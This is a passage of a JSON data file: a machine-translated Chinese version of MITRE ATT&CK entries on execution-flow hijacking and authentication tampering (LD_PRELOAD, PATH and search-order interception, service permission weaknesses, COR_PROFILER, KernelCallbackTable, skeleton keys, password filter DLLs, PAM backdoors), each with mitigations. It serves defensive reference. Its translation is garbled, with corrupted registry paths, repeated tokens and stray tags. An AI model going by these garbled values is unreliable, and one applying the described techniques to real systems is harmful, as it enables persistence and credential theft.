        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "使用能够检测企业内部系统上文件系统权限滥用机会并纠正它们的审计工具。诸如PowerSploit框架之类的工具包包含可用于探索服务文件系统权限弱点的系统的动力模块。"
            }
          ]
        ]
      },
      {
        "id": "M1052",
        "name": "用户帐户控制",
        "description": [
          [
            {
              "type": "text",
              "content": "关闭标准用户的UAC的特权高程"
            },
            {
              "type": "code",
              "content": " [HKEY_LOCAL_MACHINE \\ SOFTWORD \\ MICROSOFT \\ WINDOWS \\ Windows \\ CurrentVersion \\ Curstrion \\ Policies \\ System] "
            },
            {
              "type": "text",
              "content": " </code>自动拒绝高程请求，添加："
            },
            {
              "type": "code",
              "content": "  “ consentpromptpromptpromptbehavioruser”代码>。考虑通过添加以下方式为所有用户启用安装程序检测：“ eNableInstallerDetection” = dword：00000001 "
            },
            {
              "type": "text",
              "content": "。这将提示安装密码，并记录尝试。为了禁用安装程序检测，请添加："
            },
            {
              "type": "code",
              "content": "“ eNableInstallerDetection” = dword：00000000 "
            },
            {
              "type": "text",
              "content": "。这可能会在UAC检测安装程序的过程中通过剥削来防止特权的潜在提升，但将允许安装过程继续而无需记录。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制用户帐户和组的特权，以便只有授权的管理员才能与服务更改和服务二进制目标路径位置进行交互。从用户目录中拒绝执行，例如文件下载目录和临时目录。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1574.006",
    "name": "Dynamic Linker Hijacking",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Hijack Execution Flow",
    "version": "2.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过劫持环境变量来执行自己的恶意有效负载。动态链接器用于加载共享库。在程序的执行准备阶段中，动态链接器加载来自环境变量和文件共享库的绝对路径，例如Linux上的"
        },
        {
          "type": "code",
          "content": " ld_preload "
        },
        {
          "type": "text",
          "content": "，或"
        },
        {
          "type": "code",
          "content": " dyld_insert_libraries "
        },
        {
          "type": "text",
          "content": " MacOS上的"
        },
        {
          "type": "code",
          "content": " dyld_insert_libraries "
        },
        {
          "type": "text",
          "content": "。环境变量中指定的库首先加载，优先于具有相同功能名称的系统库。这些变量通常被开发人员使用来调试二进制文件，而无需重新编译，解除映射的符号，并在不更改原始库的情况下实现自定义功能。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在Linux和MacOS上，劫持动态链接器变量可能会授予对受害者进程的内存，系统/网络资源以及可能提高特权的访问。由于在合法过程中掩盖了执行，因此该方法还可以从安全产品中逃避检测。对手可以使用"
        },
        {
          "type": "code",
          "content": "导出"
        },
        {
          "type": "text",
          "content": "命令，"
        },
        {
          "type": "code",
          "content": " setEnv "
        },
        {
          "type": "text",
          "content": "函数或"
        },
        {
          "type": "code",
          "content": " putenv "
        },
        {
          "type": "text",
          "content": "函数来通过命令行设置环境变量。对手还可以利用动态链接器劫持将变量在外壳中导出变量，或使用更高级别的语法以python的"
        },
        {
          "type": "code",
          "content": " os.environ "
        },
        {
          "type": "text",
          "content": "进行编程设置变量。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在Linux上，对手可能会设置"
        },
        {
          "type": "code",
          "content": " ld_preload "
        },
        {
          "type": "text",
          "content": "指向受害者计划要求的合法库名称的恶意库，从而导致操作系统在执行受害者程序后加载对手的恶意代码。"
        },
        {
          "type": "code",
          "content": "可以通过环境变量或 /etc/ld.so.preload "
        },
        {
          "type": "text",
          "content": "文件设置LD_PRELOAD </code>。"
        },
        {
          "type": "code",
          "content": " ld_preload "
        },
        {
          "type": "text",
          "content": "指定的库被加载并通过"
        },
        {
          "type": "code",
          "content": " dlopen（）"
        },
        {
          "type": "text",
          "content": " and </code> mmap（）</code>分别映射到内存中。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在MacOS上，此行为在概念上与Linux相同，仅在较低级别实现MacOS动态库（DYLD）方面有所不同。对手可以设置"
        },
        {
          "type": "code",
          "content": " dyld_insert_libraries "
        },
        {
          "type": "text",
          "content": "环境变量，以指向包含合法库的名称或受害者程序要求的功能的恶意库。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "对手可以使用新的有效载荷来执行此技术。通过使用应用程序控制解决方案来识别并阻止通过劫持执行的潜在恶意软件，也能够阻止合法软件加载的库。"
            }
          ]
        ]
      },
      {
        "id": "M1028",
        "name": "操作系统配置",
        "description": [
          [
            {
              "type": "text",
              "content": "当MacOS中启用系统完整性保护（SIP）时，执行受保护的二进制文件时，上述环境变量将被忽略。第三方应用程序还可以利用苹果的固定运行时，确保这些环境变量受到限制。管理员可以通过设置setUID和/或setGid位，使用权利或在马赫-o二进制中具有__-restrict段来增加应用程序的限制。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1574.007",
    "name": "Path Interception by PATH Environment Variable",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Hijack Execution Flow",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过劫持用于加载库的环境变量来执行自己的恶意有效载荷。路径环境变量包含一个目录（用户和系统）列表，该操作系统会顺序搜索以搜索从脚本或命令行调用的二进制文件。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以将恶意程序放在存储在路径环境变量中的目录列表中的较早条目中，从而导致操作系统在通过该路径列表中顺序搜索时执行恶意二进制文件，而不是合法的二进制。"
        }
      ],
      [
        {
          "type": "text",
          "content": "例如，在Windows上，如果对手在"
        },
        {
          "type": "code",
          "content": " c：\\ compend path path "
        },
        {
          "type": "text",
          "content": "中放置了一个名为“ net.exe”的恶意程序，那么默认情况下，该程序在"
        },
        {
          "type": "code",
          "content": " c：\\ windows \\ windows \\ system32 \\ net.exe "
        },
        {
          "type": "text",
          "content": "在路径环境变量中，当从命令行执行“ net”时，将调用"
        },
        {
          "type": "code",
          "content": " c：\\示例路径"
        },
        {
          "type": "text",
          "content": "，而不是系统的合法可执行文件，请"
        },
        {
          "type": "code",
          "content": " c：\\ windows\\ system32 \\ net.exe "
        },
        {
          "type": "text",
          "content": "。执行程序的一些方法依赖于路径环境变量来确定未给出程序路径时搜索的位置，例如从命令和脚本解释器执行程序。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手也可以直接修改$路径变量指定要搜索的目录。对手可以修改"
        },
        {
          "type": "code",
          "content": " $ path "
        },
        {
          "type": "text",
          "content": "变量，以指向他们已写入访问的目录。当调用使用$路径变量的程序时，OS搜索指定的目录并执行恶意二进制。在MacOS上，也可以通过修改$ HOME变量来执行此操作。这些变量可以使用命令行，启动CTL，UNIX shell配置修改或修改"
        },
        {
          "type": "code",
          "content": " /etc/paths.d "
        },
        {
          "type": "text",
          "content": "文件夹内容进行修改。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "在程序配置文件，脚本，路径环境变量，服务和快捷方式中查找并消除路径拦截弱点，并在函数允许时带有引号的路径变量。请注意Windows搜索顺序用于执行或加载二进制文件，并在适当的地方使用完全合格的路径。"
            }
          ],
          [
            {
              "type": "text",
              "content": "卸载软件时，请清理旧的Windows注册表键，以避免没有相关合法二进制文件的键。定期搜索并纠正或报告使用使用不安全路径配置报告软件的自定义或可用工具引入的系统上的路径拦截弱点。"
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "对手可能需要将新的二进制文件放在通过这种弱点来执行的位置。通过使用应用程序控制工具，例如Windows Defender Application Control，Applocker或软件限制策略，可以在适当的情况下使用应用程序控制工具来识别并阻止潜在的恶意软件执行路径截距。"
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "确保设置适当的权限和目录访问控制，以拒绝用户将文件写入顶级目录"
            },
            {
              "type": "code",
              "content": " c："
            },
            {
              "type": "text",
              "content": "和系统目录，例如<code> c：\\ windows \\ </code，>，以减少可以放置恶意文件执行的地方。要求将所有可执行文件放在写保护目录中。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1574.008",
    "name": "Path Interception by Search Order Hijacking",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Hijack Execution Flow",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过劫持用于加载其他程序的搜索顺序来执行自己的恶意有效载荷。由于某些程序没有使用完整路径调用其他程序，因此对手可能会将自己的文件放置在呼叫程序所在的目录中，从而应调用程序的要求启动操作系统启动其恶意软件。"
        }
      ],
      [
        {
          "type": "text",
          "content": "当对手滥用Windows搜索未给出路径的程序的顺序时，就会发生搜索顺序劫持。与DLL搜索顺序劫持不同，搜索顺序取决于用于执行程序的方法。但是，在搜索Windows系统目录之前，Windows在启动程序的目录中搜索很常见。一个对搜索顺序劫持的程序的对手（即未指定可执行路径的程序）可以通过创建以不当指定的程序命名并将其放置在启动程序的目录中来利用此漏洞的优势来利用此漏洞。"
        }
      ],
      [
        {
          "type": "text",
          "content": "例如，“ example.exe”运行命令行参数"
        },
        {
          "type": "code",
          "content": " net user "
        },
        {
          "type": "text",
          "content": "运行“ cmd.exe”。对手可以将一个名为“ net.exe”的程序放置在与示例同一目录中，“ net.exe”将运行，而不是Windows System Utility Net。另外，如果对手将一个名为“ net.com”的程序放在与“ net.exe”同一目录中“ net.exe”是由于在路径下定义的可执行扩展的顺序。"
        }
      ],
      [
        {
          "type": "text",
          "content": "搜索订单劫持也是劫持DLL负载的常见做法，并在DLL搜索订单劫持中涵盖。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "在程序配置文件，脚本，路径环境变量，服务和快捷方式中查找并消除路径拦截弱点，并在函数允许时带有引号的路径变量。请注意Windows搜索顺序用于执行或加载二进制文件，并在适当的地方使用完全合格的路径。"
            }
          ],
          [
            {
              "type": "text",
              "content": "卸载软件时，请清理旧的Windows注册表键，以避免没有相关合法二进制文件的键。定期搜索并纠正或报告使用使用不安全路径配置报告软件的自定义或可用工具引入的系统上的路径拦截弱点。"
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "对手可能需要将新的二进制文件放在通过这种弱点来执行的位置。通过使用应用程序控制工具，例如Windows Defender Application Control，Applocker或软件限制策略，可以在适当的情况下使用应用程序控制工具来识别并阻止潜在的恶意软件执行路径截距。"
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "确保设置适当的权限和目录访问控制，以拒绝用户将文件写入顶级目录"
            },
            {
              "type": "code",
              "content": " c："
            },
            {
              "type": "text",
              "content": "和系统目录，例如<code> c：\\ windows \\ </code，>，以减少可以放置恶意文件执行的地方。要求将所有可执行文件放在写保护目录中。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1574.009",
    "name": "Path Interception by Unquoted Path",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Hijack Execution Flow",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过劫持脆弱的文件路径参考来执行自己的恶意有效载荷。对手可以通过将可执行文件放置在路径中的较高级别目录中，以利用缺乏周围报价的路径，从而使Windows选择对手的可执行文件进行启动。"
        }
      ],
      [
        {
          "type": "text",
          "content": "如果路径有一个或多个空间，并且不被引号包围，那么服务路径和快捷路径也可能容易受到路径拦截的影响（例如，"
        },
        {
          "type": "code",
          "content": " c：\\ space \\ program.exe.exe.exe.exe </code.exe </code.exe </code.exe </code.exe </code </code </code </code </code.vs.“ C：\\带有Space \\ Program.exe的安全路径” "
        },
        {
          "type": "text",
          "content": "）。（存储在Windows注册表密钥中）对手可以将可执行文件放在路径的较高级别目录中，Windows将解决该可执行文件而不是预期的可执行文件。例如，如果快捷方式中的路径为"
        },
        {
          "type": "code",
          "content": " c：\\ program Files \\ MyApp.exe "
        },
        {
          "type": "text",
          "content": "，对手可以在"
        },
        {
          "type": "code",
          "content": " c：\\ program.exe "
        },
        {
          "type": "text",
          "content": "中创建一个程序运行而不是预期的程序。"
        }
      ],
      [
        {
          "type": "text",
          "content": "如果定期调用可执行文件，则该技术可用于持久性，如果较高的特权过程启动了截距可执行文件，则可以使用特权升级。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "在程序配置文件，脚本，路径环境变量，服务和快捷方式中查找并消除路径拦截弱点，并在函数允许时带有引号的路径变量。请注意Windows搜索顺序用于执行或加载二进制文件，并在适当的地方使用完全合格的路径。"
            }
          ],
          [
            {
              "type": "text",
              "content": "卸载软件时，请清理旧的Windows注册表键，以避免没有相关合法二进制文件的键。定期搜索并纠正或报告使用使用不安全路径配置报告软件的自定义或可用工具引入的系统上的路径拦截弱点。"
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "对手可能需要将新的二进制文件放在通过这种弱点来执行的位置。通过使用应用程序控制工具，例如Windows Defender Application Control，Applocker或软件限制策略，可以在适当的情况下使用应用程序控制工具来识别并阻止潜在的恶意软件执行路径截距。"
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "确保设置适当的权限和目录访问控制，以拒绝用户将文件写入顶级目录"
            },
            {
              "type": "code",
              "content": " c："
            },
            {
              "type": "text",
              "content": "和系统目录，例如<code> c：\\ windows \\ </code，>，以减少可以放置恶意文件执行的地方。要求将所有可执行文件放在写保护目录中。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1574.010",
    "name": "Services File Permissions Weakness",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Hijack Execution Flow",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过劫持服务使用的二进制文件来执行自己的恶意有效载荷。对手可能会在Windows服务权限中使用缺陷来替换服务开始时执行的二进制文件。这些服务过程可以自动执行特定的二进制文件作为其功能的一部分或执行其他操作。如果包含目标二进制的文件系统目录上的权限或二进制本身上的权限不正确，则可以使用用户级权限将目标二进制文件与另一个二进制文件覆盖并通过原始过程执行。如果原始过程和线程在较高的权限级别下运行，则替换的二进制文件也将在更高级别的权限下执行，其中可能包括系统。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用这种技术用恶意替代合法的二进制文件，作为在较高权限级别执行代码的一种手段。如果将执行过程设置为在特定时间或在某个事件中运行（例如，系统启动），则该技术也可以用于持久性。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "使用能够检测企业内部系统上文件系统权限滥用机会并纠正它们的审计工具。诸如PowerSploit框架之类的工具包包含可用于探索服务文件系统权限弱点的系统的动力模块。"
            }
          ]
        ]
      },
      {
        "id": "M1052",
        "name": "用户帐户控制",
        "description": [
          [
            {
              "type": "text",
              "content": "关闭标准用户的UAC的特权高程"
            },
            {
              "type": "code",
              "content": " [HKEY_LOCAL_MACHINE \\ SOFTWORD \\ MICROSOFT \\ WINDOWS \\ Windows \\ CurrentVersion \\ Curstrion \\ Policies \\ System] "
            },
            {
              "type": "text",
              "content": " </code>自动拒绝高程请求，添加："
            },
            {
              "type": "code",
              "content": "  “ consentpromptpromptpromptbehavioruser”代码>。考虑通过添加以下方式为所有用户启用安装程序检测：“ eNableInstallerDetection” = dword：00000001 "
            },
            {
              "type": "text",
              "content": "。这将提示安装密码，并记录尝试。为了禁用安装程序检测，请添加："
            },
            {
              "type": "code",
              "content": "“ eNableInstallerDetection” = dword：00000000 "
            },
            {
              "type": "text",
              "content": "。这可能会在UAC检测安装程序的过程中通过剥削来防止特权的潜在提升，但将允许安装过程继续而无需记录。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制用户帐户和组的特权，以便只有授权的管理员才能与服务更改和服务二进制目标路径位置进行交互。从用户目录中拒绝执行，例如文件下载目录和临时目录。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1574.011",
    "name": "Services Registry Permissions Weakness",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Hijack Execution Flow",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过劫持服务使用的注册表条目来执行自己的恶意有效载荷。对手可能会在权限中使用与服务相关的注册表键的缺陷，以从最初指定的可执行文件重定向到他们控制的键，以便在服务启动时启动自己的代码。Windows在"
        },
        {
          "type": "code",
          "content": " hklm \\ System \\ CurrentControlset \\ Services "
        },
        {
          "type": "text",
          "content": "下，在注册表中存储本地服务配置信息。可以操纵下存储在服务注册表键下的信息，以通过服务控制器，SC.EXE，PowerShell或Reg等工具来修改服务的执行参数。通过访问控制列表和用户权限控制对注册表键的访问。"
        }
      ],
      [
        {
          "type": "text",
          "content": "如果无法正确设置用户和组的权限，并允许访问服务注册表键，则对手可能会将服务的BinPath/ImagePath更改为指向其控件下的其他可执行文件。当服务启动或重新启动时，对手控制程序将执行，从而使对手建立持久性和/或特权升级到帐户上下文中，该服务设置为在（本地/域名，系统，System，Localservice，或Localserservice或LocalService，或网络服务）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手也可能会更改服务注册表中的其他注册表键。例如，可以更改"
        },
        {
          "type": "code",
          "content": " FailureCommand "
        },
        {
          "type": "text",
          "content": "密钥，以便在服务失败或故意损坏的任何时候在高架上下文中执行该服务。"
        }
      ],
      [
        {
          "type": "text",
          "content": ""
        },
        {
          "type": "code",
          "content": " performance "
        },
        {
          "type": "text",
          "content": "键包含驱动程序服务dll的名称以及DLL中多个导出功能的名称。如果<Code> dermative </code>键尚未存在，并且如果对手控制的用户具有"
        },
        {
          "type": "code",
          "content": "创建子键</code "
        },
        {
          "type": "text",
          "content": "权限，则对手可能会在此处创建"
        },
        {
          "type": "code",
          "content": " performance </code </code </code "
        },
        {
          "type": "text",
          "content": "键服务的注册表树指向恶意的DLL。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手还可以添加"
        },
        {
          "type": "code",
          "content": "参数"
        },
        {
          "type": "text",
          "content": "密钥，该密钥存储特定于驱动程序的数据或其他自定义子键，以建立持久性或启用其他恶意活动。此外，如果对手使用svchost.exe启动其恶意服务，则可以使用"
        },
        {
          "type": "code",
          "content": " hkey_local_machine \\ system \\ currentControlset \\ services \\ services \\ serviceName \\ parameters \\ parameters \\ serviceCeeders \\ servicedll </code "
        },
        {
          "type": "text",
          "content": "来识别服务的文件。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1024",
        "name": "限制注册表许可",
        "description": [
          [
            {
              "type": "text",
              "content": "确保为注册表设置适当的权限，以防止用户修改可能导致特权升级的系统组件的密钥。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1574.012",
    "name": "COR_PROFILER",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Hijack Execution Flow",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会利用COR_Profiler环境变量来劫持加载.NET CLR的程序的执行流。COR_PROFILER是一个.NET框架功能，它允许开发人员指定一个未托管的（或外部的.NET）分析dll，将加载到每个.NET过程中，该进程加载了通用语言运行时（CLR）。这些探查器旨在监视，故障排除和调试由.NET CLR执行的托管代码。"
        }
      ],
      [
        {
          "type": "text",
          "content": "COR_Profiler环境变量可以在各种范围（系统，用户或过程）上设置，从而产生不同级别的影响。在注册表中指定了系统和整个用户环境变量范围，其中组件对象模型（COM）对象可以注册为Profiler dll。也可以在不修改注册表的情况下内置内存中创建过程范围cor_profiler。从.NET Framework 4开始，只要在COR_Profiler_Path环境变量中指定DLL的位置，DLL就不需要注册。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会滥用cor_profiler建立持久性，每次调用CLR时，在所有.NET过程中都会执行恶意DLL。如果受害者.NET流程以较高的许可级别执行，以及.NET流程提供的挂钩和损害防御措施，则COR_Profiler也可用于提升特权（EX：旁路用户帐户控制）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "通过使用能够审核和/或阻止未批准的DLL的应用程序控制解决方案（例如Applocker），识别并阻止潜在的恶意无管理的COR_Profiler分析DLL。"
            }
          ]
        ]
      },
      {
        "id": "M1024",
        "name": "限制注册表许可",
        "description": [
          [
            {
              "type": "text",
              "content": "确保为注册中心设置适当的权限，以防止用户修改与COR_Profiler相关的密钥。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制用户帐户的特权，以便只有授权的管理员可以编辑系统环境变量。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1574.013",
    "name": "KernelCallbackTable",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Hijack Execution Flow",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用"
        },
        {
          "type": "code",
          "content": " kernelcallcallbacktable "
        },
        {
          "type": "text",
          "content": "，以劫持其执行流程以运行自己的有效载荷。"
        },
        {
          "type": "code",
          "content": " kernelcallcallbacktable "
        },
        {
          "type": "text",
          "content": "可以在过程环境块（PEB）中找到，并在加载"
        },
        {
          "type": "code",
          "content": " user32.dll "
        },
        {
          "type": "text",
          "content": "后，将GUI进程可用的一系列图形功能初始化。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用"
        },
        {
          "type": "code",
          "content": " kernelcallcallbacktable "
        },
        {
          "type": "text",
          "content": "劫持过程的执行流，通过用恶意有效载荷替换原始回调函数。可以通过各种方式来修改回调函数，涉及相关行为，例如反射代码加载或过程注入到另一个过程中。"
        }
      ],
      [
        {
          "type": "text",
          "content": "可以通过找到peb（例如：通过呼叫"
        },
        {
          "type": "code",
          "content": " ntqueryInformationProcess（）"
        },
        {
          "type": "text",
          "content": " </code>本机api函数来获得"
        },
        {
          "type": "code",
          "content": " kernelcallbacktable "
        },
        {
          "type": "text",
          "content": " </code>的指针。指针位于指针后，"
        },
        {
          "type": "code",
          "content": " kernelcallbacktable "
        },
        {
          "type": "text",
          "content": "可以重复，并且在表中设置了一个函数（例如，"
        },
        {
          "type": "code",
          "content": " fncopydata "
        },
        {
          "type": "text",
          "content": "）设置为恶意有效载荷的地址（ex：ex：ex：fia <<代码> writeProcessMemory（）</code>）。然后，将固定在表格的新地址更新。调用篡改功能后，将触发恶意有效载荷。"
        }
      ],
      [
        {
          "type": "text",
          "content": "通常使用Windows消息调用篡改功能。劫持过程并执行恶意代码后，"
        },
        {
          "type": "code",
          "content": " kernelcallcallbacktable "
        },
        {
          "type": "text",
          "content": "也可以通过恶意有效载荷将其恢复为原始状态。将"
        },
        {
          "type": "code",
          "content": "内核返回"
        },
        {
          "type": "text",
          "content": "用于劫持执行流程可能会从安全产品中逃避检测，因为可以在合法的过程中掩盖执行。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1040",
        "name": "预防端点的行为",
        "description": [
          [
            {
              "type": "text",
              "content": "可以将某些端点安全解决方案配置为基于指示器的常见序列（例如：执行特定API函数），以阻止与过程注入/内存篡改有关的某些类型的行为。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1556.001",
    "name": "Domain Controller Authentication",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Modify Authentication Process",
    "version": "2.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以在域控制器上修补身份验证过程，以绕过典型的身份验证机制并启用访问帐户。"
        }
      ],
      [
        {
          "type": "text",
          "content": "恶意软件可用于将虚假凭据注入域控制器的身份验证过程中，目的是创建用于访问任何用户帐户和/或凭据的后门（例如：skeleton键）。Skeleton密钥通过企业域控制器身份验证过程（LSASS）的补丁程序，具有对手可以用来绕过标准身份验证系统的凭据。修补后，对手可以使用注入的密码成功身份验证任何域用户帐户（直到域控制器的重新启动从内存中删除骨架键）。身份验证的访问可以使单因素身份验证环境中对主机和/或资源的不受限制访问。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1032",
        "name": "多因素身份验证",
        "description": [
          [
            {
              "type": "text",
              "content": "将多因素身份验证（MFA）整合为组织政策的一部分，可以大大降低对手获得对有效凭证的控制的风险，这些凭据可用于其他策略，例如初始访问，横向移动和收集信息。MFA也可以用于限制对云资源和API的访问。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "审计域和本地帐户以及其许可级别通常会寻找可以通过获得特权帐户的凭据来获得广泛访问的情况。如果启用了默认帐户，或者创建尚未授权的新本地帐户，这些审核也应包括在内。遵循企业网络设计和管理的最佳实践，以限制行政层的特权帐户使用。"
            }
          ]
        ]
      },
      {
        "id": "M1025",
        "name": "特权过程完整性",
        "description": [
          [
            {
              "type": "text",
              "content": "启用功能，例如LSA的受保护的过程灯（PPL）。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1556.002",
    "name": "Password Filter DLL",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Modify Authentication Process",
    "version": "2.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以将恶意密码过滤器动态链接库（DLL）注册到身份验证过程中，以在验证时获取用户凭据。"
        }
      ],
      [
        {
          "type": "text",
          "content": "Windows密码过滤器是域和本地帐户的密码策略执行机制。过滤器被实现为包含一种针对密码策略验证潜在密码的方法。滤波器DLL可以放在本地计算机上，用于本地帐户和/或域帐户的域控制器。在安全客户经理（SAM）中注册新密码之前，本地安全管理局（LSA）请求每个注册过滤器的验证。在每个注册过滤器确认验证之前，任何潜在的更改都无法生效。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以注册恶意密码过滤器，以从本地计算机和/或整个域收获凭据。要执行适当的验证，过滤器必须从LSA获得普通文本凭据。每次提出密码请求时，恶意密码过滤器都会收到这些普通文本凭据。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1028",
        "name": "操作系统配置",
        "description": [
          [
            {
              "type": "text",
              "content": "确保仅注册有效的密码过滤器。Windows安装目录中必须存在过滤器dll（默认情况下的C：\\ Windows \\ System32 \\）和/或本地计算机，该计算机在HKEY_LOCAL_MACHINE \\ SYSTEM \\ currentControlset \\ CurrentControlSet \\ LSA \\ LSA \\ Notification Package中具有相应的条目。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1556.003",
    "name": "Pluggable Authentication Modules",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Modify Authentication Process",
    "version": "2.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以修改可插入身份验证模块（PAM）以访问用户凭据，或启用原本无理的对帐户的访问。PAM是一个模块化的配置文件，库和可执行文件的系统系统，可指导许多服务的身份验证。最常见的身份验证模块是"
        },
        {
          "type": "code",
          "content": " pam_unix.so "
        },
        {
          "type": "text",
          "content": "，它在"
        },
        {
          "type": "code",
          "content": "/etc/etc/passwd "
        },
        {
          "type": "text",
          "content": "和<code>/etc/etc/etcs </code中检索，集合和验证帐户身份验证信息>。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以修改PAM系统的组件以创建后门。PAM组件，例如"
        },
        {
          "type": "code",
          "content": " pam_unix.so "
        },
        {
          "type": "text",
          "content": "，可以修补以接受任意的对手提供的值作为合法的凭据。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对PAM系统的恶意修改也可能被滥用以窃取凭据。对手可以用代码感染PAM资源以收获用户凭据，因为与PAM组件交换的值可能是普通文本，因为PAM不存储密码。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1032",
        "name": "多因素身份验证",
        "description": [
          [
            {
              "type": "text",
